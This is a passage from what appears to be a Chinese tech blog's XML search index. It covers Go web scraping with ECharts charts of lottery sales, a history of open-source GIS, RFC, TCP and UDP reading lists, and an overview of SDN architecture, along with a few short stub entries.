//fmt.Printf("======arr[%d]=\n [%s] \n", index, value) if strings.Index(value, "全国彩票") &gt; 0 &#123; reg := regexp.MustCompile(`全国共销售彩票([\d]+.[\d]+)\S+`) result := reg.FindStringSubmatch(value) if len(result) &gt; 0 &#123; caipiao.Total = result[1] &#125; &#125; &#125; &#125; &#125;) //id="appendix" html.Find("#appendix").Each(func(i int, s *goquery.Selection) &#123; href, _ := s.Find("a").Eq(0).Attr("href") //附件 caipiao.Attachid = href &#125;) //===== export data save_csv("./data/caipiao_result.csv", caipiao) return err&#125; 2017年11月份全国彩票销售情况,385.552017年10月份全国彩票销售情况,376.532017年9月份全国彩票销售情况,369.282017年8月份全国彩票销售情况,350.672017年7月份全国彩票销售情况,337.552017年6月份全国彩票销售情况,338.42 可视化图表：以 ECharts 为例常见的图表库，本文案例使用 ECharts 作为图表组件 HighCharts：JavaScript 编写，开源许可证允许个人用户和非商业用途。 Baidu ECharts：底层画图基于 Canvas, BSD 许可证协议。 Kartograph：构建交互式地图轻量级类库。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//http://echarts.baidu.com/demo.html#line-gradientdata = [["2017年11月",385.55],["2017年10月",376.53],["2017年9月",369.28],["2017年8月",350.67],["2017年7月",337.55],["2017年6月",338.42],["2017年11月",385.55],["2017年10月",376.53],["2017年9月",369.28],["2017年8月",350.67],["2017年7月",337.55],["2017年6月",338.42],["2017年11月",385.55],["2017年10月",376.53],["2017年9月",369.28],["2017年8月",350.67],["2017年7月",337.55],["2017年6月",338.42],["2017年5月",376.95],["2017年4月",382.45],["2017年3月",379.33],["2017年2月",0],["2017年1月",291.61],["2016年12月",365.94],["2016年11月",344.82],["2016年10月",338.27],["2016年9月",320.71],["2016年8月",310.12],["2016年7月",324.03],["2016年6月",339.61],["2016年5月",346.19],["2016年4月",348.89],["2016年3月",356.88],["2016年2月",224.54],["2016年1月",326.41],["2015年12月",341.21],["2015年11月",306.30],["2015年10月",312.34],["2015年9月",290.78],["2015年8月",280.96],["2015年7月",270.47],["2015年6月",281.2371],["2015年5月",321.07],["2015年5月",321.07],["2015年4月",326.12],["2015年3月",308.12],["2015年2月",247.90],["2015年1月",392.33],["2014年12月",361.53],["2014年11月",341.18],["2014年10月",327.01],["2014年9月",322.52],["2014年8月",315.36],["2014年7月",372.09],["2014年6月",360.54],["2014年5月",307.94],["2014年4月",315.29],["2014年3月",328.74],["2014年2月",200.1],["2014年1月",271.49],["2013年12月",302.73],["2013年11月",274.16],["2013年10月",271.83],["2013年9月",257.62],["2013年8月",246.18],["2013年7月",243.65],["2013年6月",247.46],["2013年5月",273.41],["2013年4月",285.61],["2013年3月",273.37],["2013年2月",168.65],["2013年1月",248.59],["2012年12月",268.01],["2012年11月",237.06],["2012年10月",215.38],["2012年9月",205.12],["2012年8月",197.12],["2012年7月",201.98],["2012年6月",216.14],["2012年5月",236.16],["2012年4月",235.76],["2012年3月",235.79],["2012年2月",202.17],["2012年1月",164.54],["2011年12月",224.80],["2011年11月",210.08],["2011年10月",203.28],["2011年9月",196.44],["2011年8月",187.72],["2011年7月",182.05],["2011年6月",174.53],["2011年5月",187.28],["2011年3月",190.12],["2011年2月",112.92],["2011年1月",160.09],["2010年12月",171.89],["2010年11月",160.24],["2010年10月",149.95],["2010年9月",139.56],["2011年4月",186.50],["2010年8月",135.75],["2010年7月",132.74],["2010年6月",140.71],["2010年5月",144.38],["2010年4月",141.05],["2010年3月",132.52],["2010年2月",86.71],["2010年1月",126.99],["2009年12月",133.30],["2009年11月",117.05],["2009年10月",116.47],["2009年9月",111.73],["2009年8月",110.64],["2009年7月",107.87],["2009年6月",113.51],["2009年5月",121.59],["2009年4月",114.61],["2009年3月",114.49],["2009年2月",89.21],["2009年1月",74.33],["2008年12月",102.07],["2008年11月",94.09],["2008年10月",79.88],["2008年8月",84.66]];var dateList = data.map(function (item) &#123; return item[0];&#125;);var valueList = data.map(function (item) &#123; return item[1];&#125;);option = &#123; // Make gradient line here visualMap: [&#123; show: false, type: 'continuous', seriesIndex: 0, min: 0, max: 400 &#125;, &#123; show: false, type: 'continuous', seriesIndex: 1, dimension: 0, min: 0, max: dateList.length - 1 &#125;], title: [&#123; left: 'center', text: 'Gradient along the y axis' &#125;, &#123; top: '55%', left: 'center', text: 'Gradient along the x axis' &#125;], tooltip: &#123; trigger: 'axis' &#125;, xAxis: [&#123; data: dateList &#125;, &#123; data: dateList, gridIndex: 1 &#125;], yAxis: [&#123; splitLine: &#123;show: false&#125; &#125;, &#123; splitLine: &#123;show: false&#125;, gridIndex: 1 &#125;], grid: [&#123; bottom: '60%' &#125;, &#123; top: '60%' &#125;], series: [&#123; type: 'line', showSymbol: false, data: valueList &#125;, &#123; type: 'line', showSymbol: false, data: valueList, xAxisIndex: 1, yAxisIndex: 1 &#125;]&#125;; 最佳实践 默认调色板(palette) 1234567891011121314151617Navy — #001f3fBlue — #0074d9Aqua — #7fdbffTeal — #39ccccOlive — #3d9970Green — #2ecc40Lime — #01ff70Yellow — #ffdc00Orange — #ff851bRed — #ff4136Maroon — #85144bFuchsia — #f012bePurple — #b10dc9Black — #111111Gray — #aaaaaaSilver — #ddddddWhite — #ffffff 优化图表JS生成模板图表定型之后，可以通过模板固化配置，根据需要动态生成目标文件（html,js,svg等等），详见基于 Markdown 的 HTML 网页模板。 优化采集器 Goroutines “线程池”例如：PostgreSQL Exception: Open too many files 优化数据存储例如：常用的 GIS 坐标库 扩展阅读：开源工具与案例在线词云 WordArt.com:仅支持英文，精美，首选 Tagxedo:支持中、英文（中文分词效果一般），需要安装插件Silverlight Tag Crowd &amp; Google Adwords golang-based library golang.org/net/http github.com/celrenheit/spider goquery: jQuery-style HTML manipulation in Go github.com/henrylee2cn/pholcus_lib Pholcus is a distributed, high concurrency and powerful web crawler software 可视化图表案例 中国主要城市空气质量实况 中国经济十年时空漫游（2002-2011） 可视化图表技术方案 基于 SVG : D3、Raphael 基于 Canvas : Echarts HighCharts国外开源产品，JavaScript 编写，自带主题、动态交互方便，目前公司新版业务视图、地图应用、交互式流量图等是基于这个库实现。不足：缺少中文文档，开源许可证只允许个人用户和非商业用途，规模应用存在法律风险。 Baidu ECharts最早源于百度各种业务系统报表需求，底层画图基于 Canvas 。2013年开源，完全免费的BSD协议。特点：拖拽重计算，第三方标准格式支持，中文社区支持实例：http://echarts.baidu.com/doc/example.htmlGithub: https://github.com/ecomfe/echarts KartographKartograph 是个构建交互式地图的简单、轻量级类库。它包含两个库，一个用Python写的，用于产生漂亮和压缩的SVG地图，另一个是js类库用于前端展示地图用。 lchart(go-based) 朝花夕拾|showtext：字体，好玩的字体和好玩的图形 | 原创 2016-11-06 统计之都 统计之都 Themes for ggplot2. 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（十）公共数据源列表 参考文献]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（四）开源地理信息系统简史]]></title>
    <url>%2F2017%2F05%2F12%2FVisualization-GIS%2F</url>
    <content type="text"><![CDATA[摘要 开源 GIS 技术简史 1.1、GIS 的起源: MOSS and GRASS 1.2、GIS 的发展：GeoTools, GDAL, PostGIS 和 GeoServer 1.3、创新和教育：开源项目驱动 1.4、开源 GIS 的商业支持 Demo:A Full Stack Geo-enabled Internet of Things (IoT) Solution 一、开源 GIS 技术简史：从渺小到改变世界 原文: A History of Open Source GIS, from Humble Beginnings to World-Changing Applications | 23 Jun 2017 9:00am, by Anthony Calamito 数字制图和地理空间信息系统（Geographic Information System,GIS）的出现彻底改变了人们和对周围世界思考、互动的方式。将位置信息分层重叠用于决策的概念首先是由 Ian McHarg（景观设计师）在上世纪60年代提出。大约在同一时间，Roger Tomlinson —— 人们普遍称之为“GIS 之父”（Father of GIS） 完成了他的博士论文，主要研究使用计算方法处理分层的地理空间信息。罗杰随后致力于创建第一个计算机化的地理信息系统——加拿大地理信息系统（the Canada Geographic Information System），主要用于勘探测绘。 开源 GIS 的起源可以追溯到 1978 年的美国内政部（U.S. Department of the Interior）。从那时起，开源 GIS 基于不同的知识产权许可证，深入影响到许多行业的发展，包括政府和商业领域。美国劳工部称 GIS 技术为二十一世纪最重要的三大高增长产业之一。开源 GIS 技术在过去四十年的发展，直到今天演变出许多具有开创性和影响力的应用。 1.1、GIS 的起源: MOSS and GRASS1978年，美国内政部创建了 MOSS 系统（the Map Overlay and Statistical System ，地图叠加和统计系统）。MOSS 系统主要用于跟踪和评估矿山开发对环境、野生植物、野生动物及其迁徙方式的影响。这是第一个广泛部署，基于矢量（Vector Based）、可互动的地理信息系统。第一套 GIS 生产部署在小型机上。 随后不久，GRASS (“草” ，Geographic Resources Analysis Support System，地理资源分析支持系统）诞生。GRASS 系统拥有 350 多个模块用于处理栅格、拓扑向量、图像和图形数据，该软件最初设计提供给美国军方使用，以协助土地管理和环境规划。GRASS 系统广泛应用于科学研究和商业领域，包括地理空间数据管理和分析、图像处理、空间和时间建模以及创建图形和地图。 1.2、GIS 的发展：GeoTools, GDAL, PostGIS 和 GeoServer1996，利兹大学（the University of Leeds）在一个项目上开始创建基于 Java 开发语言的地理信息库，设计可以被纳入不同的应用需要。最终的成果是 GeoTools，一个可以操纵空间数据的开源库，在今天广泛应用于Web地理空间信息服务，网络地图服务和桌面应用程序。 四年后，一个跨平台的地理信息库 GDAL (Geospatial Data Abstraction Library, 地理空间数据抽象库) 出现了 。GDAL 使得 GIS 应用程序可以支持不同的数据格式，它还附带了各种有用的命令行工具，用于处理和转换各种数据格式。GDAL 支持超过 50 个栅格格式和20 个矢量格式的数据，它是全世界使用最广泛的地理空间数据访问库，支持的应用程序包括谷歌地球（Google Earth），GRASS，QGIS、FME（the Feature Manipulation Engine）和ArcGIS。 2001年，Refractions Research(加拿大 IT 咨询机构，创建于1998年)， 研发了开源项目 PostGIS ，使得空间数据可以存储在 Postgres 数据库。同年，GeoServer 创建，一个基于 Java 语言开发的应用程序，用于将空间数据发布为标准的Web服务。PostGIS 和 GeoServer 项目都取得了令人难以置信的成功，今天广泛应用于开源 GIS 数据库和 GIS 服务器。 1.3、创新和教育：开源项目驱动QGIS 被认为是在开源桌面 GIS 的鼻祖。QGIS 在2002发布，它集成了GRASS 系统的分析功能，以及 GDAL 对于数据格式支持，提供一个用户友好的桌面应用程序进行数据编辑、地图制图与分析。QGIS 可以和其他开源 GIS 互相操作，例如；管理 PostGIS 数据库，将数据发布到 GeoServer 作为 Web 服务。 在21世纪初，开源GIS 继续获得发展动力， 创建的开源孵化项目是 OSGeo 和 LocationTech。OSGeo 在 2006 年被推出，设计目标是支持开源 GIS 软件的协同开发，以及促进相关软件的广泛应用。LocationTech 是在 Eclipse 基金会(the Eclipse Foundation ) 中设立的一个工作组，旨在促进 GIS 技术在学术研究者，产业和社区之间的合作。 2011 年，“Geo for All” 创建。他是是开源地理空间基金会（Open Source Geospatial Foundation）的教育推广项目，目的是使人人都能接触到地理空间技术教育的机会。作为该基金会的工作成果，许多开源 GIS 的教育资源能在互联网上免费提供，包括 FOSS4G Academy 和 GeoAcademy。最后，“Geo for All” 致力于在世界各地建立了开源地理空间实验室和研究中心，以支持开源的地理空间技术开发、培训和研究。 1.4、开源 GIS 的商业支持在2013年，我工作的 Boundless 公司，成为第一家提供世界上最流行开源 GIS 应用软件的公司，包括数据库、服务器、桌面、网络、移动和云级别的商业支持和维护。Boundless 的产品套件确保了大型组织利用开源 GIS 技术的时候获得成功所需要的充分技术支持。该公司为最流行的开源 GIS 软件提供持续升级和补丁更新。 1.5、The Future and Beyond目前，现代计算的挑战要求将软件部署在云平台工作，并支持创建大量数据所带来的需求。两种开源 GIS 软件解决方案可以满足这些挑战，包括 GeoMesa，一个开源的分布式时空数据库，GeoTrellis，一个支持高性能应用的地理数据处理引擎。 这两种解决方案在2014中引入，可以处理云中的地理空间大数据。由于它们是建立在开源框架之上的，用户不需要商业软件许可证就可以使用而不必担心受到惩罚，而且可以按照用户需要进行弹性扩展。 开源 GIS 拥有美好的前景和巨大的潜力，它使得增强协作、共享有价值的数据和访问关键资源成为可能。凭借其众多的环境、政府、公共安全和健康应用，开源GIS 技术及其应用项目具有改变世界的潜力。 Demo:A Full Stack Geo-enabled Internet of Things (IoT) Solution Github:https://github.com/amollenkopf/dcos-iot-demo using Mesosphere’s open sourced Data Center Operating System (DC/OS) using Docker containerization and frameworks for Mesos including Marathon, Kafka, Spark, and Elasticsearch. 二、GIS Technology Applications12ogr2ogr -f GeoJSON -where &quot;NAME_1=&apos;CHINA&apos;&quot; CHM_geo.json CHN_adm1.shp ogr2ogr -f GeoJSON -where &quot;NAME_1=&apos;Guangdong&apos;&quot; Guangdong2_geo.json CHN_adm2.shp 十行代码看到空气质量指数(leafletCN/geojsonMap) Resources 图书馆|德克萨斯州大学奥斯汀分校 University of Texas at Austin|美军标准中国地图 China AMS Topographic Maps 美军军用地图|中国·广州|1950 年 1：250，000 比例尺 扩展阅读 美国内政部 | U.S. Department of the Interior美国内政部（United States Department of the Interior，缩写：DOI）与大多数国家的内政部负责警察或安全事务不同，负责管理美国联邦政府拥有的土地、开采和保护美国的自然资源，并负责有关阿拉斯加、夏威夷原住民和美国岛屿地区领土事务。下辖美国地质调查局、国家公园管理局、土地管理局等机构。 美国地质调查局 | U.S. Geological Survey美国地质调查局（United States Geological Survey，缩写：USGS）是美国内政部辖下的科学机构，是内政部唯一一个纯粹的科学部门，有约一万名人员，总部设在弗吉尼亚州雷斯敦。美国地质调查局的科学家主要研究美国的地形、自然资源和自然灾害与其的应付方法；负责四大科学范畴：生物学、地理学、地质学和水文学。 美国地质调查局是美国的主要公共地图制作机构，制作线上的美国地图，又与商业公司合作向公众销售地图； 负责全球地震监测（美国地震资讯中心，科罗拉多），负责管理地震监测系统、地磁监测系统（公布磁场和实时磁力表）； 参与地球、月球和行星的探测和地图制作（从1962年开始）； 负责国家野生动植物健康中心：野生动物、植物和生态系统；在国内运行17个生物研究中心； 负责国家火山早期预警中心（2005年）：改善美国国内的169座火山的监测，研究新的监测方法。 Refractions Research(加拿大 IT 咨询机构，创建于1998年) 开源地理空间基金会（Open Source Geospatial Foundation） OSGeo 中国中心 | 在线地图资源库 GeoMesa，一个开源的分布式时空数据库 GeoTrellis，一个支持高性能应用的地理数据处理引擎 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 参考文献 A History of Open Source GIS, from Humble Beginnings to World-Changing Applications | 23 Jun 2017 9:00am, by Anthony Calamito Mesosphere DC/OS Brings Large-Scale Real-Time Processing to Geospatial Data | 29 Sep 2017 6:00am, by Scott M. Fulton III 何苞旦:中国古人如何绘制地图]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机 RFC 文档]]></title>
    <url>%2F2017%2F05%2F12%2FProtocol-RFC%2F</url>
    <content type="text"><![CDATA[摘要 互联网研究任务组（Internet Research Task Force,IRTF） 互联网工程任务组（Internet Engineering Task Force，IETF） 在建立ARPNET时，美国国防部成立了一个非正式委员会来监督它的运行。1983年，该委员会更名为 Internet活动委员会（IAB，Internet Activities Board），后来缩写词改为 Internet 体系结构委员会（Internet Architecture Board）。 1989年，IAB 被重新改组，研究人员被重组到IRTF更加专注于长期研究，IETF处理短期的工程事项： 互联网研究任务组（Internet Research Task Force,IRTF） 互联网工程任务组（Internet Engineering Task Force，IETF） IETF 主要任务负责互联网相关技术规范的研发和制定 IETF 体系结构 互联网架构委员会（IAB） 互联网工程指导委员会（IESG） 工作组（八个领域：Internet路由，传输，应用领域等） IETF文件类别 草案（Internet Draft): 没有特殊限制，进行标准化工作的起点。 RFC（Request For Comments）: 正式的可以永久存档的标准文件，按顺序推出，批准出台后不做更改。 List RFC1035 DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION RFC1492: An Access Control Protocol, Sometimes Called TACACS RFC5424:About Syslog RFC6749:OAuth 2.0，OAuth2 is an authentication framework RFC7519:JSON web tokens,JWT is an authentication protocol Internet Control Messages Protocol (ICMP) RFC 792 Internet Group Management Protocol (IGMP) RFC 3376 Transmission Control Protocol (TCP) RFC 793 Exterior Gateway Protocol RFC 888 User Datagram Protocol (UDP) RFC 768 IPv6 Routing Header RFC 1883 IPv6 Fragment Header RFC 1883 ICMP for IPv6 RFC 1883 RFC1191: Path MTU Discovery 参考文献]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络协议：TCP]]></title>
    <url>%2F2017%2F05%2F12%2FProtocol-TCP%2F</url>
    <content type="text"><![CDATA[摘要 Transmission Control Protocol (TCP) RFC 793 ABC Computer architecture for network engineers:TCP vs CPU Application OpenSource:LVS (基于LVS的AAA负载均衡架构实践) Catalog:Protocol,网络协议参考文献 阮一峰：TCP协议简介 赵亚： 使用TCP时序图解释BBR拥塞控制算法的几个细节 赵亚： TCP协议疑难杂症全景解析 TCP/IP模型从下往上，功能增加，需要实现的设备减少，然而设备的复杂性却在增加，这样保证了成本的最小化，至于性能或者因素，靠软件来调节吧，TCP协议就是这样的软件，实际上最开始的时候，TCP并不考虑性能，效率，公平性，正是考虑了这些，TCP协议才复杂了起来。 TCP puzzlers | Dave Pacheco’s Blog 在 skynet 中处理 TCP 的分包 | 云风的BLOG 理解 TCP/IP 网络栈 | Cizixs]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络协议：UDP]]></title>
    <url>%2F2017%2F05%2F12%2FProtocol-UDP%2F</url>
    <content type="text"><![CDATA[摘要 User Datagram Protocol (UDP) RFC 768 ABCApplication OpenSource:Ganglia (基于Ganglia实现集群性能态势感知) Writing DNS messages from scratch using GoHow to write a DNS message from zero and send it via UDP to a server. 故障诊断 Linux 系统 UDP 丢包问题分析思路 参考文献 docker 容器网络下 UDP 协议的一个问题 | Cizixs 可靠 UDP 传输 | 云风的BLOG 1000,000 packets/s的挑战]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[长城防火墙(GWF)的前世今生]]></title>
    <url>%2F2017%2F05%2F12%2FCyberSecurity-GFW%2F</url>
    <content type="text"><![CDATA[The Great Fire Wall of ChinaHistory 道高一尺，墙高一丈：互联网封锁是如何升级的(2008-2015) 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Museum：博物馆大全]]></title>
    <url>%2F2017%2F05%2F12%2FArtistic-Museum%2F</url>
    <content type="text"><![CDATA[摘要 上海博物馆 南京·瞻园 广州湿地公园 上海博物馆 特色：官印、佛教造像、钱币 探宝：上海博物馆 南京·瞻园 江南园林艺术鉴赏 生态资源 Birdwatching|广州湿地公园 参考文献 2017中国大陆最受欢迎博物馆&amp;version=12020610&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=wzPalUQCGMuertNpP1zALisPg50oKz9XGAGkZ8G0WZBL1a8ibX3D1lii7YN6Vqn7)]]></content>
      <tags>
        <tag>Art</tag>
        <tag>摄影</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Virtualization]]></title>
    <url>%2F2017%2F05%2F12%2FVirtualization%2F</url>
    <content type="text"><![CDATA[摘要待编辑 参考文献 semaphoreci.com 中兴刘超年：虚拟化交换机性能优化探讨实录]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（一）：架构概览]]></title>
    <url>%2F2017%2F05%2F12%2FSDN%2F</url>
    <content type="text"><![CDATA[摘要 Background：为什么需要 SDN SDN的主要解决方案 SDN的整体应用架构 SDN与网络安全 OpenFlow工作原理 OpenFlow在SDN架构中的角色 Background软件定义网络（Software-defined networking，SDN），一种新的网络架构。SDN 提出的控制与转发平面分离、网络状态集中控制、支持软件编程等理念并不是什么新鲜事，但是长久以来一直没有非常突破性的进展。 “为了让系统更好地工作，早期需要管理复杂性而后期需要提取简单性。” —唐·诺曼（Donald Arthur Norman） 目前 SDN 引起广泛关注得益于网络需求侧翻天覆地的变化：云计算业务（服务器虚拟化技术为代表）成为主流，移动互联网催生的大数据技术日益普及，包括网络在内的资源快速配置、弹性扩容、按需调用需求强烈。传统模式的弊端显现：网络设备硬件、操作系统和网络应用三部分紧耦合在一起，组成一个封闭系统，这三部分相互依赖、每一部分的创新和演进都要求其余部分做出同样的升级。 越来越多的网络新协议和新算法使得网络控制平面变得越来越复杂，但是现在的网络用户却对网络的易用性有更高的要求，希望网络具有更多的可编程能力，从而自动化、智能化网络管理。正如 SDN 的倡导者 Scott Shenker,U.C. Berkeley Professor 所言，网络发展目前还处于“管理复杂性”阶段，这样的架构严重阻碍了网络创新进程的开展。 SDN Solutions如何解决从“管理复杂性”阶段转变到“提取简单性”阶段呢？最先取得成功商用经验的是互联网企业Google。 Google 的 SDN 实践Google 基于 SDN 技术改造其骨干网 G-scale（Backbone Network，也称WAN网）。WAN网的主要任务是负责全球12个数据中心之间的互联，数据流量的内容包括：1. 用户数据备份，例如视频、图片、语音等；2. 跨数据中心存储访问，例如计算资源和存储资源分布不同；3. 大规模的数据同步。WAN 网成本高昂（包括很多海底光缆），而且存在数据流量大但是链路带宽利用率低的问题：为了实现负载均衡，同时避免大流量都被分发到同一个链路上导致丢包，Google不得不使用过量链路，提供比实际需要多得多的带宽，实际链路带宽利用率只有30%~40%，而且仍不可避免有的链路很空闲，有的链路产生拥塞，设备必须支持很大的包缓存，成本高。为了增强网络的可管理性，Google 首先在带宽分配和路径计算方面尝试。解决思路是当一个新的数据要开始传输时，应用程序会评估所需要耗用的带宽，为它选择一条最优路径（如负载最轻但非最短路径，虽不丢包但延时大），然后把这个应用对应的策略通过控制器（Controller）下发到定制的交换机中，跟选择的路径绑定在一起，从而整体上使链路带宽利用率达到最优。 SDN 架构中最显著的一个特点就是采用集中式控制器（Controller）： SDN ArchitectureSDN在应用中大体上可以可以划分为三层体系结构： 应用层（Application Layer） 控制层（Control Layer） 基础设施层（Infrastructure Layer） 不同层次之间通过接口通讯： 北向接口（Northbound interface） 南向接口（Sorthbound interface） 控制层（ Control Layer ）控制层是 SDN 控制器管理网络的基础设施，可以根据需要灵活选择多种控制器。在这一层中，控制器中包含大量业务逻辑，以获取和维护不同类型的网络信息、状态详细信息、拓扑细节、统计详细信息等。由于 SDN 控制器是用于管理网络的，所以它必须具有用于现实世界网络使用情况的控制逻辑，如交换、路由、二层VPN、三层VPN、防火墙安全规则、DNS、DHCP和集群，网络供应商和开源社区需要在自己的 SDN 控制器中实现自己的服务。这些服务会向上层（应用层）公开自己的API（通常是基于 REST ，这使网络管理员可以方便地使用应用程序上的 SDN 控制器的配置、管理和监控网络。 目前市场上的 SDN 控制器解决方案大致可以分为两类：大型网络设备厂商提供商业方案，例如 Cisco Open SDN controller, Juniper Contrail, Brocade SDN controller, 和来自 NEC 公司的 PFC SDN controller ；社区组织提供的开源方案，例如 OpenDaylight, Floodlight, Beacon, Ryu 等等。 Commercial Solutions: Cisco Open SDN Controller Juniper Contrail Brocade SDN controller PFC SDN controller(From NEC) Open Source Solutions: Beacon：由斯坦福大学开发，Java语言编写 Floodlight：源于Beacon，Big Switch Networks开发，Java语言编写，Apache许可证 OpenDaylight： Ryu：由 NTT 开发，Python 编写，能够与 OpenStack 平台整合，控制器API丰富 Mul: 由 Kulcloud 开发，内核采用 C 语言实现的多线程架构 NodeFlow: 由 Cisco 开发，基于 Node.js 的 OpenFlow 控制器，JavaScript 编写 Trema: 由 NEC 开发，Ruby/C 编写 NOX: 由 Nicira 开发，C++/Python编写，业界第一款 OpenFlow 控制器 POX: 由 Nicira 开发，是 NOX 的纯 Python 实现版本，目的是提供跨平台部署的便利性 基础设施层（ Infrastructure Layer ）基础设施层，由各种网络设备构成。它可以是数据中心的一组网络交换机和路由器。控制层负责管理底层物理网络，物理层的实现可以是支持 OpenFlow 的硬件交换机，随着虚拟化技术的完善，SDN 交换机可以是软件形态，例如 Open vSwitch (OVS) 就是一款基于开源技术实现的、能够与服务器虚拟化（Hypervisor）集成，具备交换机的功能，可以实现虚拟化组网。另外，OVS 支持传统的标准管理接口，例如 NetFlow 、sFlow 等，监测虚拟环境中的流量情况，详见 《浅谈基于数据分析的网络态势感知》 。 应用层（ Application Layer ）应用层对于开发者来说是开放区域，鼓励开发尽可能多的创新应用。包括网络的可视化：拓扑结构、网络状态、网络统计等；网络自动化相关应用：网络配置管理，网络监控，网络故障排除，网络安全策略等。SDN 应用程序可以为企业和数据中心网络提供各种端到端的解决方案。 例如，Brocade 应用实例： Brocade Flow Optimizer Brocade Virtual router Brocade Network advisor HPE 应用实例： HPE Network Optimizer HPE Network protector HPE Network visualizer NEC UNC for HP SDN VAN Controller Aricent SDN Load balancer TechM smart flow steering TechM server load balancer 南向接口（ Southbound interface ）控制层到基础设施层（网络交换机）通讯需要经过南向接口，目前主要的协议是 OpenFlow , NetConf，OVSDB 。 OpenFlow 协议是事实上的国际行业标准，NOX 、Onix 、Floodlight 等都是基于 OpenFlow 控制协议的开源控制器。作为一个开放的协议，OpenFlow 突破了传统网络设备厂商各自为政形成的设备能力接口壁垒。 北向接口（ Northbound interface ）北向接口：应用层 通过 API 的方式 与 SDN 控制器通讯。与南向接口不同，现在北向接口还缺少业界公认的标准，实现方案思路有的从用户角度出发、有的从运营商角度出发、有的从产品能力角度出发。技术风格上，部分传统的网络设备厂商倾向于在现有的设备上提供编程接口供业务App调用，许多上层应用的开发者也比较倾向于采用 REST API 接口的形式。 SDN 世界的两大山头SDN 技术体系目前还处于激烈竞争阶段，相关新产品和新技术层出不穷，如果要梳理大致可以分为两个流派： ONF(Open Networking Foundation，开放网络基金会 )董事会成员：德国电信（DT）、Facebook、 Google, Microsoft、Verizon、Yahoo!、日本 NTT 电信、高盛公司特点：面向用户 传统巨头大联盟（通过Linux基金会(Linux Foundation)合作）成员：思科（Cisco）、IBM、 微软、Big Switch、博科、思杰、戴尔、爱立信、富士通、英特尔、瞻博网络、微软、NEC、惠普、红帽和VMware协作项目：OpenDaylight（20130408）特点：大厂控制“嫌疑” SDN 标准化组织 IETF（Internet Engineering Task Force，互联网工程任务组）相对 ONF 而言，更多是由网络设备厂商主导，已经发布了多篇 RFC 文稿，内容涉及需求、框架、协议、转发但愿模型及 MIB 等。 ETSI NFV(Network Functions Virtualisation)成员：欧洲电信标准协会（European Telecommunications Standards Institute，ETSI）包括 AT&amp;T, 英国电信（BT）, 德国电信等特点：主要工作成果是 “网络功能虚拟化白皮书”，对NFV的定义、应用场景、基本功能，以及SDN等技术的关系等内容进行描述。 ITU-T （国际电信联盟通信标准化组织）由 ITU-T 指定的国际标准通常被称为建议（Recommendations）,2012年开始 SDN 与电信网络结合的标准研究。 SDN 与网络安全 （待补充）高可用性支持 如果 SDN 控制器只配置了一条源和目的路径，一旦链路失效如何快速将流量路由到正常链路？（持续监控网络拓扑、实时性） 外部连接的高可用性，支持VRRP（Virtual Router Redundancy Protocol）, MC-LAG(Multi-Chassis Link Aggregation Group)等 如何避免控制器成为新的单点故障源？（硬件、软件冗余设计，控制器集群化（OpenFlow v1.2开始引入），控制器集群同步能力） 企业级的授权和隔离 支持企业级的授权和认证 确保租户能在共享的网络基础资源上获得完全隔离的虚拟网络 抗恶意攻击能力 需要具备对控制类通讯的流量限制，怀疑被攻击是的告警能力 专题合辑：Software Defined NetworkSDN 技术指南（二）：OpenFlow OpenFlow 的工作原理 OpenFlow 在 SDN 架构中的角色：OpenFlow is a communications protocol Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? OpenDaylight SDN 技术指南（四）：Open vSwitch Open vSwitch 安装 Open vSwitch 命令行 Open vSwitch 运行原理 Open vSwitch 性能监控 Preview SDN 技术指南（五）：NFV 网络虚拟化 SDN vs NFVSDN: separates the network’s control (brains) and forwarding (muscle) planes and provides a centralized view of the distributed network for more efficient orchestration and automation of network services. NFV: focuses on optimizing the network services themselves. NFV decouples the network functions, such as DNS, Caching, etc., from proprietary hardware appliances, so they can run in software to accelerate service innovation and provisioning, particularly within service provider environments. Preview SDN 技术指南（六）：OpenStack or Kubernetes ? Preview SDN 技术指南（七）：产业联盟与标准化组织 